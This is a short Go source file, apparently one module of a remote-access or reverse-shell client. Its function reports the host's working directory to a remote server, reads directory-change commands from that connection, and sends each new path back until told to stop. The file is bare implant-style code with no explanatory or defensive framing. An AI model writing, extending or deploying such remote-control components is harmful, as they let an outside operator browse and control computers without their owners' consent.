package Move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFileSystem(connection net.Conn) (err error) {
	// send the present location to the server
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println("[-] Can't get present directory")
	}
	fmt.Println(pwd)

	pwd_raw := pwd + "\n"
	nbyte, err := connection.Write([]byte(pwd_raw))
	fmt.Println("\n[+]", nbyte, "bytes were written")

	CommandReader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {
		user_command_raw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Unable to read command ")
		}

		result := strings.TrimSpace(user_command_raw)
		if result == "stop" {
			loopControl = false
			break
		}
		user_command := strings.TrimSpace(user_command_raw)
		//  cd ..
		// [cd, ..]
		// cd
		user_command_arr := strings.Split(user_command, " ")

		if len(user_command_arr) > 1 {
			dir2move := user_command_arr[1]
			err = os.Chdir(dir2move)
			if err != nil {
				fmt.Println("[-] Unable to change directory")
			}
		}

		pwd, err = os.Getwd()

		nbytes, err := connection.Write([]byte(pwd + "\n"))
		fmt.Println("[+] Pwd written to the server, ", nbytes, "bytes were written")

	}
	return
}
